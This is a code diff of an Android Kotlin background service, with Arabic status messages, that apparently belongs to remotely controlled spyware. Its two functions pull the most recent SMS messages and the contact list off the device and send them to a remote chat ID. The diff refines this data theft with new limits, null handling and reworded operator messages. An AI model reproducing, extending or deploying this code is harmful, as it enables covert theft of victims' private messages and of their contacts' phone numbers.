@@ -587,51 +587,76 @@ class BackgroundControlService : Service() {
 
     private fun extractSmsArchive(chatId: String) {
         if (!hasPermission(Manifest.permission.READ_SMS)) {
-            sendDirectMessage(chatId, "❌ صلاحية قراءة الرسائل غير ممنوحة من قبل النظام.")
+            sendDirectMessage(chatId, "❌ فشل: صلاحية قراءة الرسائل (READ_SMS) غير ممنوحة من النظام.")
             return
         }
         executionExecutor.execute {
             try {
-                val uri = Uri.parse("content://sms")
+                val uri = Uri.parse("content://sms/inbox")
                 val projection = arrayOf("address", "body", "date")
-                val sb = StringBuilder("💬 رسائل SMS (آخر 100):\n")
+                val sb = StringBuilder("💬 أرشيف رسائل SMS (آخر 50):\n\n")
                 var count = 0
+                
                 contentResolver.query(uri, projection, null, null, "date DESC")?.use { cursor ->
                     val addrIdx = cursor.getColumnIndexOrThrow("address")
                     val bodyIdx = cursor.getColumnIndexOrThrow("body")
-                    while (cursor.moveToNext() && count < 100) {
-                        sb.append("• من: ${cursor.getString(addrIdx)}\n  ${cursor.getString(bodyIdx)?.take(150)}\n")
+                    while (cursor.moveToNext() && count < 50) {
+                        val sender = cursor.getString(addrIdx) ?: "مجهول"
+                        val body = cursor.getString(bodyIdx)?.take(100) ?: ""
+                        sb.append("• من: $sender\n  النص: $body\n\n")
                         count++
                     }
                 }
-                sendDirectMessage(chatId, if (count == 0) "ℹ️ لا توجد رسائل." else sb.toString())
+                
+                if (count == 0) {
+                    sendDirectMessage(chatId, "ℹ️ صندوق الرسائل فارغ أو لا يمكن الوصول إليه.")
+                } else {
+                    sendDirectMessage(chatId, sb.toString())
+                }
             } catch (e: Exception) {
-                sendDirectMessage(chatId, "❌ خطأ استخراج الرسائل: ${e.message}")
+                sendDirectMessage(chatId, "❌ خطأ تقني أثناء سحب الرسائل: ${e.message}")
             }
         }
     }
 
     private fun extractContactsDirectory(chatId: String) {
         if (!hasPermission(Manifest.permission.READ_CONTACTS)) {
-            sendDirectMessage(chatId, "❌ صلاحية جهات الاتصال غير ممنوحة من قبل النظام.")
+            sendDirectMessage(chatId, "❌ فشل: صلاحية جهات الاتصال (READ_CONTACTS) غير ممنوحة من النظام.")
             return
         }
         executionExecutor.execute {
             try {
-                val projection = arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER)
-                val sb = StringBuilder("📇 جهات الاتصال (أول 500):\n")
+                val projection = arrayOf(
+                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
+                    ContactsContract.CommonDataKinds.Phone.NUMBER
+                )
+                val sb = StringBuilder("📇 دليل جهات الاتصال (أول 100):\n\n")
                 var count = 0
-                contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, projection, null, null, "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC")?.use { cursor ->
+                
+                contentResolver.query(
+                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                    projection,
+                    null,
+                    null,
+                    "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
+                )?.use { cursor ->
                     val nameIdx = cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                     val numIdx = cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)
-                    while (cursor.moveToNext() && count < 500) {
-                        sb.append("• ${cursor.getString(nameIdx)}: ${cursor.getString(numIdx)}\n")
+                    while (cursor.moveToNext() && count < 100) {
+                        val name = cursor.getString(nameIdx) ?: "بدون اسم"
+                        val number = cursor.getString(numIdx) ?: ""
+                        sb.append("• $name: $number\n")
                         count++
                     }
                 }
-                sendDirectMessage(chatId, if (count == 0) "ℹ️ لا توجد جهات اتصال." else sb.toString())
+                
+                if (count == 0) {
+                    sendDirectMessage(chatId, "ℹ️ لا توجد جهات اتصال مخزنة.")
+                } else {
+                    sendDirectMessage(chatId, sb.toString())
+                }
             } catch (e: Exception) {
-                sendDirectMessage(chatId, "❌ خطأ استخراج جهات الاتصال: ${e.message}")
+                sendDirectMessage(chatId, "❌ خطأ تقني أثناء سحب جهات الاتصال: ${e.message}")
             }
         }
     }
